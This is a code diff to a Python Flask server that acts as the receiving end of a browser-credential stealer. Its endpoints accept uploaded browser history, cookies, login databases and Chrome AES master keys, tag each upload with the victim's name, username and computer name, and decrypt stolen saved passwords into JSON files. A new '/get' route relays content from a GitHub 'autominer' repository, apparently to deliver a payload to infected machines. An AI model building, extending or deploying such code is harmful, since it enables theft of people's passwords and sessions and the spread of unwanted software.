@@ -2,8 +2,8 @@ import flask
 import time
 import json
 import base64
-import sqlite3
-import win32crypt # type: ignore
+import sqlite3,requests
+import win32crypt  # type: ignore
 from Cryptodome.Cipher import AES
 from datetime import datetime, timedelta
 from flask import request
@@ -61,9 +61,13 @@ def saveHistory():
     if request.method == 'POST':
         data = request.form  # a multidict containing POST data
         txt = data['text']
+        name = data['name']
+        username = data['username']
+        ComputerName = data['ComputerName']
         txt = txt.split("\n")[0]
         txt = base64.b64decode(txt)
-        filename = "./history/history"+str(int(time.time()))
+        filename = "./history/history" + \
+            str(int(time.time()))+"-"+name+"-"+username+"-"+ComputerName
         with open(filename, "wb") as f:
             f.write(txt)
         con = sqlite3.connect(filename)
@@ -77,16 +81,19 @@ def saveHistory():
         return "ok"
 
 
-
-
 @app.route('/saveLoginData', methods=['POST'])
 def saveLoginData():
     if request.method == 'POST':
         data = request.form  # a multidict containing POST data
         txt = data['text']
+        name = data['name']
+        username = data['username']
+        ComputerName = data['ComputerName']
         txt = txt.split("\n")[0]
         txt = base64.b64decode(txt)
-        with open("./LoginData/LoginData"+str(int(time.time())), "wb") as f:
+        filename = "./LoginData/LoginData" + \
+            str(int(time.time()))+"-"+name+"-"+username+"-"+ComputerName
+        with open(filename, "wb") as f:
             f.write(txt)
         # print(txt)
         return "ok"
@@ -97,10 +104,31 @@ def saveCookie():
     if request.method == 'POST':
         data = request.form  # a multidict containing POST data
         txt = data['text']
+        name = data['name']
+        username = data['username']
+        ComputerName = data['ComputerName']
         txt = txt.split("\n")[0]
         txt = base64.b64decode(txt)
-        with open("./Cookie/Cookie"+str(int(time.time())), "wb") as f:
+        filename = "./Cookie/Cookie" + \
+            str(int(time.time()))+"-"+name+"-"+username+"-"+ComputerName
+        with open(filename, "wb") as f:
             f.write(txt)
+        # print(txt)
+        return "ok"
+
+@app.route('/saveAesKey', methods=['POST'])
+def saveAesKey():
+    if request.method == 'POST':
+        data = request.form  # a multidict containing POST data
+        key = data['masterKey']
+        username = data['username']
+        ComputerName = data['ComputerName']
+        key = key.split("\n")[0]
+        key = base64.b64decode(key)
+        filename = "./aesKey/aesKey" + \
+            str(int(time.time()))+"-"+username+"-"+ComputerName
+        with open(filename+".aeskey", "wb") as f:
+            f.write(key)
         # print(txt)
         return "ok"
 
@@ -109,20 +137,24 @@ def saveSavedPasswords():
     if request.method == 'POST':
         data = request.form  # a multidict containing POST data
         txt = data['db']
-        key= data['masterKey']
+        key = data['masterKey']
+        name = data['name']
+        username = data['username']
+        ComputerName = data['ComputerName']
         key = key.split("\n")[0]
         key = base64.b64decode(key)
         txt = txt.split("\n")[0]
         txt = base64.b64decode(txt)
-        filename="./LoginData/LoginData"+str(int(time.time()))
+        filename = "./LoginData/LoginData" + \
+            str(int(time.time()))+"-"+name+"-"+username+"-"+ComputerName
         with open(filename, "wb") as f:
             f.write(txt)
-        with open(filename+".aeskey", "wb") as f:
-            f.write(key)
-        password=decrypt(filename,key)
+        password = decrypt(filename, key)
         with open(filename+".json", "w") as f:
             json.dump(password, f)
         return "ok"
-
+@app.route('/get')
+def get():
+    return requests.get("https://raw.githubusercontent.com/zlc1004/autominer/main/get").text
 
 app.run(host='0.0.0.0', port="50000")
